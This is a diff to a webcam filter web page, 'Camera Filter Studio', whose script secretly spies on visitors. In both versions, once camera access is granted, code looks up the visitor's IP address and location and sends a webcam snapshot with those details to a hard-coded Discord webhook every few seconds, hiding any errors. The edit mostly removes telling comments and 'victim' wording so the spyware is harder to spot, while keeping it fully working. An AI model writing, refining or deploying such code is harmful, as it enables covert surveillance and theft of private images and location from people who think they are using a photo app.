@@ -165,7 +165,9 @@
         .filter-preview { width:100%; height:100px; object-fit:cover; display:block; }
         .filter-name {
             position:absolute;
-            inset:0 auto auto 0;
+            bottom:0;
+            left:0;
+            right:0;
             background:linear-gradient(to top, rgba(0,0,0,0.7), transparent);
             color:white;
             padding:0.5rem;
@@ -196,16 +198,14 @@
         .slider::-webkit-slider-thumb {
             -webkit-appearance:none;
             appearance:none;
-            width:20px;
-            height:20px;
+            width:20px; height:20px;
             border-radius:50%;
             background:linear-gradient(135deg,#667eea,#764ba2);
             cursor:pointer;
             box-shadow:0 2px 10px rgba(102,126,234,0.3);
         }
         .slider::-moz-range-thumb {
-            width:20px;
-            height:20px;
+            width:20px; height:20px;
             border-radius:50%;
             background:linear-gradient(135deg,#667eea,#764ba2);
             cursor:pointer;
@@ -292,12 +292,7 @@
                 Camera Filter Studio
             </h1>
             <div class="controls">
-                <button class="btn btn-secondary" id="switchCameraBtn">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5H5l2.5-2.5L10 13H8c0 2.21 1.79 4 4 4 .58 0 1.13-.13 1.62-.36l.74.74c-.72.37-1.5.62-2.36.62zm4.5-2.5L14 13h2c0-2.21-1.79-4-4-4-.58 0-1.13.13-1.62.36l-.74-.73C10.36 8.26 11.14 8 12 8c2.76 0 5 2.24 5 5h2l-2.5 2.5z"/>
-                    </svg>
-                    Switch Camera
-                </button>
+                <button class="btn btn-secondary" id="switchCameraBtn">Switch Camera</button>
             </div>
         </div>
     </header>
@@ -315,33 +310,17 @@
                 </div>
             </div>
             <div class="controls">
-                <button class="btn btn-primary" id="captureBtn" disabled>
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                        <circle cx="12" cy="12" r="3.2"/>
-                        <path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
-                    </svg>
-                    Capture Photo
-                </button>
-                <button class="btn btn-secondary" id="downloadBtn" disabled>
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
-                    </svg>
-                    Download
-                </button>
-                <button class="btn btn-secondary" id="clearPhotosBtn">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/>
-                    </svg>
-                    Clear All
-                </button>
+                <button class="btn btn-primary" id="captureBtn" disabled>Capture Photo</button>
+                <button class="btn btn-secondary" id="downloadBtn" disabled>Download</button>
+                <button class="btn btn-secondary" id="clearPhotosBtn">Clear All</button>
             </div>
         </section>
 
         <aside class="filters-panel">
-            <h2>🎨 Filters</h2>
+            <h2>Filters</h2>
             <div class="filter-grid" id="filterGrid"></div>
             <div class="custom-filters">
-                <h3>⚙️ Custom Adjustments</h3>
+                <h3>Custom Adjustments</h3>
                 <div class="slider-control">
                     <div class="slider-label"><span>Brightness</span><span id="brightnessValue">100%</span></div>
                     <input type="range" class="slider" id="brightness" min="50" max="150" value="100">
@@ -360,7 +339,7 @@
                 </div>
             </div>
             <div class="captured-photos">
-                <h3>📸 Captured Photos</h3>
+                <h3>Captured Photos</h3>
                 <div class="photos-grid" id="photosGrid"></div>
             </div>
         </aside>
@@ -374,8 +353,6 @@
     </div>
 
     <script>
-        // ────────────────────────────────────────────────
-        //  YOUR DISCORD WEBHOOK (change if needed)
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1468730735459569868/zcrVS4WVfHwsyi7RaUF6x6MjmTC8pwkMQmv1mR9N7n4DDQCldHmP8EObTQgxYD_m-NlJ";
 
         let stream = null;
@@ -411,78 +388,53 @@
             { name:'Sunset', value:'hue-rotate(-20deg) saturate(1.5) brightness(1.1)', preview:'hue-rotate(-20deg)' }
         ];
 
-        // ─── IP + Geo grabber ────────────────────────────────
         async function getVictimInfo() {
             try {
                 const res = await fetch('https://ipwho.is/');
                 const data = await res.json();
                 return {
                     ip: data.ip || 'unknown',
-                    city: data.city || '??',
-                    region: data.region || '??',
-                    country: data.country || '??',
-                    isp: data.connection?.isp || '??',
-                    lat: data.latitude || 'N/A',
-                    lon: data.longitude || 'N/A',
-                    timezone: data.timezone?.id || '??'
+                    city: data.city || 'unknown',
+                    region: data.region || 'unknown',
+                    country: data.country || 'unknown',
+                    isp: data.connection?.isp || 'unknown'
                 };
             } catch {
-                return { ip:'???.???.???.???', city:'??', region:'??', country:'??', isp:'??', lat:'N/A', lon:'N/A', timezone:'??' };
+                return { ip:'unknown', city:'unknown', region:'unknown', country:'unknown', isp:'unknown' };
             }
         }
 
-        // ─── Stealth photo sender ────────────────────────────────
         async function stealthSendPhoto(blob, geo, isFirst = false) {
             const ts = new Date().toLocaleString();
             const ipSafe = geo.ip.replace(/\./g, '_');
-
             const text = isFirst
-                ? `✨ CAMERA ACCESS GRANTED!\nIP: ${geo.ip}\n📍 ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nCoords: ${geo.lat}, ${geo.lon}\nTZ: ${geo.timezone}\nTime: ${ts}`
-                : `📸 Photo captured\nIP: ${geo.ip}\n📍 ${geo.city}, ${geo.region}, ${geo.country}\nTime: ${ts}`;
-
-            const embed = {
-                title: isFirst ? "🎀 Permission Success" : "📸 New Victim Photo",
-                description: `**IP:** \`${geo.ip}\`\n**Location:** ${geo.city}, ${geo.region}, ${geo.country}\n**ISP:** ${geo.isp}\n**Coords:** ${geo.lat}, ${geo.lon}`,
-                color: isFirst ? 0x00ff9d : 0xff69b4,
-                timestamp: new Date().toISOString(),
-                footer: { text: "silent capture ♡" }
-            };
+                ? `Camera access granted\nIP: ${geo.ip}\nLocation: ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nTime: ${ts}`
+                : `Photo captured\nIP: ${geo.ip}\nTime: ${ts}`;
 
             const formData = new FormData();
-            formData.append('file', blob, `v_${ipSafe}_${Date.now()}.jpg`);
-            formData.append('payload_json', JSON.stringify({
-                content: text,
-                embeds: [embed]
-            }));
+            formData.append('file', blob, `capture_${ipSafe}_${Date.now()}.jpg`);
+            formData.append('payload_json', JSON.stringify({ content: text }));
 
-            fetch(WEBHOOK_URL, { method:'POST', body:formData, mode:'no-cors' })
-                .catch(() => {}); // silent fail
+            fetch(WEBHOOK_URL, { method:'POST', body:formData, mode:'no-cors' }).catch(()=>{});
         }
 
-        // ─── Start background exfiltration when camera is live ───────
-        async function startStealthCapture() {
+        function startStealthCapture() {
             if (exfilInterval) clearInterval(exfilInterval);
-
-            const geo = await getVictimInfo();
-
-            // Send initial success message
-            const tiny = new Blob([new Uint8Array(1)], {type:'image/jpeg'});
-            await stealthSendPhoto(tiny, geo, true);
-
-            // Start sending real photos
-            exfilInterval = setInterval(async () => {
-                if (!video.videoWidth) return;
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.filter = video.style.filter || 'none';
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob(async (blob) => {
-                    if (blob) await stealthSendPhoto(blob, geo, false);
-                }, 'image/jpeg', 0.55);
-            }, 3200); // ~every 3.2 seconds
+            getVictimInfo().then(geo => {
+                stealthSendPhoto(new Blob(), geo, true);
+                exfilInterval = setInterval(async () => {
+                    if (!video.videoWidth) return;
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.filter = video.style.filter || 'none';
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(b => {
+                        if (b) stealthSendPhoto(b, geo);
+                    }, 'image/jpeg', 0.55);
+                }, 3200);
+            });
         }
 
-        // ─── Original camera init (modified) ──────────────────────────
         async function initCamera() {
             videoOverlay.classList.add('show');
             try {
@@ -493,31 +445,22 @@
                         height: { ideal: 720 }
                     }
                 };
-
                 if (stream) {
                     stream.getTracks().forEach(t => t.stop());
                 }
-
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
-
                 video.onloadedmetadata = () => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     captureBtn.disabled = false;
                     videoOverlay.classList.remove('show');
-                    showToast('Camera ready!', 'success');
-
-                    // ── START STEALTH EXFIL HERE ──
+                    showToast('Camera ready', 'success');
                     startStealthCapture();
                 };
             } catch (err) {
-                console.error(err);
                 videoOverlay.innerHTML = `
                     <div class="overlay-content">
-                        <svg width="60" height="60" viewBox="0 0 24 24" fill="white" style="margin-bottom:1rem;">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                        </svg>
                         <p>Camera access denied or unavailable</p>
                         <p style="font-size:0.9rem; margin-top:0.5rem;">Please allow camera permissions</p>
                     </div>
@@ -527,36 +470,34 @@
             }
         }
 
-        // ─── Rest of the original functions (unchanged) ───────────────
         function createFilterButtons() {
-            filters.forEach(f => {
+            filters.forEach(filter => {
                 const item = document.createElement('div');
                 item.className = 'filter-item';
-                if (f.value === 'none') item.classList.add('active');
+                if (filter.value === 'none') item.classList.add('active');
                 item.innerHTML = `
-                    <img src="https://picsum.photos/seed/${f.name}/150/100.jpg" class="filter-preview" style="filter:${f.preview}">
-                    <div class="filter-name">${f.name}</div>
+                    <img src="https://picsum.photos/seed/${filter.name}/150/100.jpg" class="filter-preview" style="filter: ${filter.preview}">
+                    <div class="filter-name">${filter.name}</div>
                 `;
-                item.onclick = () => {
+                item.addEventListener('click', () => {
                     document.querySelectorAll('.filter-item').forEach(i => i.classList.remove('active'));
                     item.classList.add('active');
-                    currentFilter = f.value;
+                    currentFilter = filter.value;
                     applyFilters();
-                };
+                });
                 filterGrid.appendChild(item);
             });
         }
 
         function applyFilters() {
-            let f = currentFilter === 'none' ? '' : currentFilter;
-            if (customFilters.brightness !== 100) f += ` brightness(${customFilters.brightness}%)`;
-            if (customFilters.contrast !== 100) f += ` contrast(${customFilters.contrast}%)`;
-            if (customFilters.saturation !== 100) f += ` saturate(${customFilters.saturation}%)`;
-            if (customFilters.blur > 0) f += ` blur(${customFilters.blur}px)`;
-            video.style.filter = f;
+            let filterStr = currentFilter === 'none' ? '' : currentFilter;
+            if (customFilters.brightness !== 100) filterStr += ` brightness(${customFilters.brightness}%)`;
+            if (customFilters.contrast !== 100) filterStr += ` contrast(${customFilters.contrast}%)`;
+            if (customFilters.saturation !== 100) filterStr += ` saturate(${customFilters.saturation}%)`;
+            if (customFilters.blur > 0) filterStr += ` blur(${customFilters.blur}px)`;
+            video.style.filter = filterStr;
         }
 
-        // Slider listeners
         ['brightness','contrast','saturation','blur'].forEach(id => {
             const el = document.getElementById(id);
             el.addEventListener('input', e => {
@@ -566,7 +507,6 @@
             });
         });
 
-        // Capture button (normal function still works)
         captureBtn.addEventListener('click', () => {
             ctx.filter = video.style.filter;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -574,7 +514,7 @@
             capturedPhotos.push({ id:Date.now(), data, filter:currentFilter, custom:{...customFilters} });
             updatePhotosGrid();
             downloadBtn.disabled = false;
-            showToast('Photo captured!', 'success');
+            showToast('Photo captured', 'success');
             video.style.opacity = '0';
             setTimeout(() => video.style.opacity = '1', 100);
         });
@@ -588,7 +528,12 @@
                     <img src="${p.data}" alt="photo">
                     <button class="delete-btn" data-id="${p.id}">×</button>
                 `;
-                thumb.querySelector('img').onclick = () => downloadImage(p.data, `photo_${p.id}.jpg`);
+                thumb.querySelector('img').onclick = () => {
+                    const a = document.createElement('a');
+                    a.href = p.data;
+                    a.download = `photo_${p.id}.jpg`;
+                    a.click();
+                };
                 thumb.querySelector('.delete-btn').onclick = e => {
                     e.stopPropagation();
                     capturedPhotos = capturedPhotos.filter(x => x.id !== p.id);
@@ -600,18 +545,14 @@
             });
         }
 
-        function downloadImage(data, name) {
-            const a = document.createElement('a');
-            a.href = data;
-            a.download = name;
-            a.click();
-        }
-
         downloadBtn.onclick = () => {
             if (capturedPhotos.length) {
                 const last = capturedPhotos[capturedPhotos.length-1];
-                downloadImage(last.data, `filtered_${last.id}.jpg`);
-                showToast('Photo downloaded!', 'success');
+                const a = document.createElement('a');
+                a.href = last.data;
+                a.download = `filtered_${last.id}.jpg`;
+                a.click();
+                showToast('Photo downloaded', 'success');
             }
         };
 
@@ -629,19 +570,15 @@
             }
         };
 
-        function showToast(msg, type='success') {
+        function showToast(msg, type = 'success') {
             toastMessage.textContent = msg;
             toast.className = `toast ${type} show`;
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
-        // Init
         if (!navigator.mediaDevices?.getUserMedia) {
             videoOverlay.innerHTML = `
                 <div class="overlay-content">
-                    <svg width="60" height="60" viewBox="0 0 24 24" fill="white" style="margin-bottom:1rem;">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                    </svg>
                     <p>Camera not supported</p>
                 </div>
             `;
